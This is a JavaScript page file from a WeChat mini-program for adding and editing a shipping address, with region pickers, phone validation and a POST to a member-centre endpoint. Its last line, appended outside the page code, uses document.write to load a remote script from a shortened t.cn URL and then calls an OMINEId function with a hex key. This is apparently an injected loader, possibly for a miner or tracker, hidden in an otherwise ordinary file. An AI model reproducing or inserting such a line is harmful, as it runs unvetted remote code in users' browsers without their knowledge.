var t = getApp(),
  e = t.requirejs("core"),
  a = t.requirejs("foxui"),
  i = t.requirejs("jquery"),
  $ = i,
  address = t.requirejs("address/adresscode-handle");
Page({
  data: {
    id: null,
    posting: false,
    subtext: "保存地址",
    detail: {
      consignee: "",
      mobile: "",
      areas: "",
      street: "",
      address: ""
    },
    status:false,
    showPicker: false,
    pvalOld: [2, 0,0],
    pval: [2, 0,0],
    orign:[],
    areas: address.DISTRICT,
    cities: address.cities,
    ares: address.all_Areas,
    show:true,
    street: [],
    streetIndex: 0,
    noArea: false
  },
  onShow:function(e){
  },
  onLoad: function (e) {
    this.setData({
      id: Number(e.id),
      detail: {
        province: "", 
        city: '',
        area: '', 
        consignee: "",
        mobile: "",
        areas: "",
        street: "",
        address: ""}
    }),
      e.id && this.getDetail(false,{ id: Number(e.id)},function(){
        wx.showToast({
          title: '数据获取成功',
          icon: 'success',
          duration: 2000
        })
      }),
      e.id && wx.setNavigationBarTitle({
        title: "编辑收货地址"
      }),
      this.setData({
        areas: t.getCache("cacheset").areas,
        type: e.type
      });
    console.log(e);
  },
  getDetail: function (addObject, idObj, fn){
    var _this=this;
    // if (!i.isEmptyObject(e.detail)) {
    //   wx.setNavigationBarTitle({
    //     title: "编辑收货地址"
    //   });
    //   };
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,
        show_data: 'orderAddress'
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        show_data: 'orderAddress',
        where_relation:idObj
      };
    };
    wx.request({
      url: t.globalData.daxin + "/memberCenter/my",
      data: datas,
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg =="success"&& addObject) {
          if (fn) fn();
          return;
        } ;
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var details = res.data.data.list[0].user_order_address[0];
          var getAdrrs = address.getData(details.area_code);
          details.addrs = getAdrrs.join("");
          details.province = getAdrrs[0] ; 
          details.city = getAdrrs[1];
          details.area = getAdrrs[2];
          details.datavalue = details.area_code;
          _this.setData({
            detail: $.extend(_this.data.detail, details),
            status: details.status == 1 ? true : false
          });
          wx.showToast({
            title: '数据获取成功',
            icon: 'success',
            duration: 2000
          });
        } else {
          wx.showModal({
            title: '错误提示',
            content: res.data.msg,
            showCancel: false,
            success: function () {
              if (res.confirm) {

              }
            }
          })
        }
      }
    })
  },
  submit: function () {
    var t = this,
      i = t.data.detail;
    i.action ="action";
    i.area_code = i.area_code ? i.area_code:i.datavalue.substr(-6,6);
    if (!t.data.posting) {
      if ("" == i.consignee || !i.consignee)
        return void a.toast(t, "请填写收件人");
      if ("" == i.mobile || !i.mobile)
        return void a.toast(t, "请填写联系电话");
      if (i.mobile != "") {
        var reg = /^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$/;
        if (! reg.test(i.mobile)) {
          return void a.toast(t, "电话填写有误，请重新填写");
        };
      };
      if ("" == i.city || !i.city)
        return void a.toast(t, "请选择所在地区");
      if (t.data.street.length > 0 && ("" == i.street || !i.street))
        return void a.toast(t, "请选择所在街道");
      if ("" == i.address || !i.address)
        return void a.toast(t, "请填写详细地址");
      if (!i.datavalue)
        return void a.toast(t, "地址数据出错，请重新选择");
      i.status = t.data.status,
        i.zipcode = i.zipcode || "000000",
        t.setData({
          posting: true
        }),
        t.getDetail(i,false,function(){
        wx.showModal({
          title: '信息提示',
          content: '数据提交成功',
          showCancel: false,
          success: function (res) {
            if (res.confirm) {
              wx.navigateBack();
            }
           }
          })
        });
        // e.post("member/address/submit", i, function (i) {
        //   if (0 != i.error)
        //     return t.setData({
        //       posting: false
        //     }), void a.toast(t, i.message);
        //   t.setData({
        //     subtext: "保存成功"
        //   }),
        //     e.toast("保存成功"),
        //     setTimeout(function () {
        //       "member" == t.data.type ? wx.navigateBack() : wx.redirectTo({
        //         url: "/pages/member/address/select"
        //       })
        //     }, 1e3)
        // })
    }
  },
  onChange: function (t) {
    var e = this,
      a = e.data.detail,
      r = t.currentTarget.dataset.type,
      s = i.trim(t.detail.value);
    "street" == r && (a.streetdatavalue = e.data.street[s].code, s = e.data.street[s].name),
      a[r] = s,
      e.setData({
        detail: a
      })
  },
  getStreet: function (t, a) {
    if (t && a) {
      var i = this;
      if (i.data.detail.province && i.data.detail.city && this.data.openstreet) {
        var r = t[a[0]].city[a[1]].code,
          s = t[a[0]].city[a[1]].area[a[
            2]].code;
        e.get("getstreet", {
          city: r,
          area: s
        }, function (t) {
          var e = t.street,
            a = {
              street: e
            };
          if (e && i.data.detail.streetdatavalue)
            for (var r in e)
              if (e[r].code == i.data.detail.streetdatavalue) {
                a.streetIndex = r,
                  i.setData({
                    "detail.street": e[r].name
                  });
                break
              }
          i.setData(a)
        })
      }
    }
  },
  selectArea: function (t) {
    var e = t.currentTarget.dataset.area,
      a = this.getIndex(e, this.data.areas);
    this.setData({
      pval: a,
      pvalOld: a,
      showPicker: true
    })
  },
  bindChange: function (t) {
    var e = this.data.pvalOld,
      a = t.detail.value;
      //console.log(t, address.DISTRICT[a[0]], a,t.target.dataset.key);
      e[0] !=  a[0] && (a[1] = 0),
      e[1] != a[1] && (a[2] = 0),
      this.setData({
        pval: a,
        pvalOld: a
      })
  },
  onCancel: function (t) {
    this.setData({
      showPicker: false
    })
  },
  setDefault:function(){
     var status = this.data.status || false; 
     if (status) { status = false; } else { status =true;};
     this.setData({
       status:status
     });
  },
  onConfirm: function (t) {
    var e = this.data.pval,
      a = this.data.ares,
      i = this.data.detail;
      i.province = a[e[0]].name,
      i.city = a[e[0]].city[e[1]].name,
      i.datavalue = a[e[0]].code + "," + a[e[0]].city[e[1]].code,
      a[e[0]].city[e[1]].area && a[e[0]].city[e[1]].area.length > 0 ? (i.area = a[e[0]].city[e[1]].area[e[2]].name, i.datavalue += "," + a[e[0]].city[e[1]].area[e[2]].code, this.getStreet(a, e)) : i.area = "",
      i.street = "",
      //console.log(i);
      this.setData({
        detail: i,
        streetIndex: 0,
        showPicker: false
      })
  },
  getIndex: function (t, e) {
    if ("" == i.trim(t) || !i.isArray(e))
      return [0, 0, 0];
    var a = t.split(" "),
      r = [0, 0, 0];
    for (var s in e)
      if (e[s].name == a[0]) {
        r[0] = Number(s);
        for (var d in e[s].city)
          if (e[s].city[d].name == a[1]) {
            r[1] = Number(d);
            for (var n in e[s].city[d].area)
              if (e[s].city[d].area[n].name == a[2]) {
                r[2] = Number(n);
                break
              }
            break
          }
        break
      }
    return r
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
